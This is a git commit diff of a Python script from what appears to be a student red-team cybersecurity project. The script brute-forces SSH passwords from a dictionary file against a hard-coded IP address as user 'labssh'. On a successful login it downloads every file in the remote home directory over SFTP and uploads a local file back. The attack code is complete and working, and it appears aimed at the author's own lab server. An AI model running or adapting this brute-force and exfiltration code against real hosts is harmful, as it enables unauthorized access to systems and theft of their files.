d4457cb852e83e657f8499e1257e57a593ef3f4e
Juan Viquez <jviquez027@gmail.com>
2025-08-20 01:09:51 -0600

    Update ssh_brute.py

--- proyecto_ciberseguridad/red_team/ssh_brute.py
+++ proyecto_ciberseguridad/red_team/ssh_brute.py
@@ -1,44 +1,70 @@
 import paramiko
 
-#ruta_dic = "D:/Universidad_Axel/Cuatrimestres/Quinto_Cuatrimestre/Programacion_Avanzada/diccionario_pass.txt"
-
+nombre_dict = "dict.txt"
+ruta_local = "/home/juanjo/Documents/GitHub/azure-vuln-server/"
 host = "74.179.81.132"
-usuario = "labssh"
+#usuario = "labssh"
 
-def cargar_passwords_desde_archivo(ruta_archivo):
+def cargar_dict(ruta_dict):
+    claves = []
     try:
-        with open(ruta_archivo, "r") as archivo:
-            passwords = archivo.readlines()
-            if not passwords:
-                print(f"El archivo '{ruta_archivo}' está vacío.")
-                exit(1)
-            return passwords
+        with open(ruta_dict, "r") as archivo:
+            for linea in archivo:
+                claves.append(linea.strip())
+            return claves
     except FileNotFoundError:
-        print(f"El archivo '{ruta_archivo}' no fue encontrado.")
-        exit(1)
+        print(f"El archivo '{ruta_dict}' no fue encontrado.")
         
         
-def fuerza_bruta_ssh(host):
+def fuerza_bruta_ssh(host, lista_claves, ruta_local):
+    if lista_claves == None:
+        print("No se ha cargado el dicciontario")
+        return
+    
     cliente = paramiko.SSHClient()
     cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-    lista_claves = ["progra123","labprogra123","progralab123"]
-    clave_correcta = ""
-
     for clave in lista_claves:
         try:
-            print(f"intentado con: {clave}")
-            cliente.connect(host, port=22, username="labssh", password=clave, look_for_keys=False, allow_agent=False)
-            stdin, stdout, stderr = cliente.exec_command("ls -l")
-            #stdin, stdout, stderr = cliente.exec_command("echo OK")
-            print(stdout.read().decode())
+            print(f"Probando contraseña: {clave}")
+            cliente.connect(host, port=22, username="labssh", password=str(clave), look_for_keys=False, allow_agent=False)
+            print("Autenticación completada")
+            stdin, stdout, stderr = cliente.exec_command("ls")
+            if stdout.read().decode():
+                transferir_archivos(cliente, ruta_local)
+            break
+
         except paramiko.AuthenticationException:
-            print(f"Password '{clave}' falló.")
+            print(f"Intento de autenticación fallido.\n")
         except Exception as e:
             print(f"Error: {e}")
             break
 
     cliente.close()
 
+
+def transferir_archivos(conexion_ssh, ruta_local):
+    sftp = conexion_ssh.open_sftp()
+    lista_archivos = sftp.listdir()
+
+    if lista_archivos:
+        print("Archivos encontrados... Descagando...")
+        for archivo in lista_archivos:
+            try:
+                sftp.get(archivo, ruta_local+archivo)
+                print(f"Archivo: {archivo} descargado!!\n")
+            except:
+                print(f"Error al descargar el archivo: {archivo}")
+    
+    print("Subiendo archivo local.....")
+    try:
+        sftp.put(ruta_local+"dict.txt", "/home/labssh/dict.txt")
+        print("Archivo subido con exito\n")
+    except:
+        print(f"Error al subir el archivo local")
+
+
+
 if __name__ == "__main__":
-    fuerza_bruta_ssh(host)
+    lista_claves = cargar_dict(ruta_local+nombre_dict)
+    fuerza_bruta_ssh(host, lista_claves, ruta_local)
